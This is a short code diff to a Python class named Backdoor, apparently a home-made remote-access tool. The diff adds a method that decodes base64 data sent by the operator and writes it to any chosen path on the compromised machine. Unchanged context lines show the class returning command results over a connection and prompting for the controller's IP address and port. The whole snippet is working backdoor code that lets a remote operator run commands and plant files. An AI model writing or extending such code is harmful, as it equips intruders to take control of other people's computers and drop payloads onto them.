@@ -56,6 +56,11 @@ class Backdoor:
                 #need to specify self since calling function from within class
                 #self.connection.send(command_result)
             self.reliable_send(command_result)
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
     
 ip = raw_input("Enter IP Address: ")
 port = int(raw_input("Enter port number to use: "))
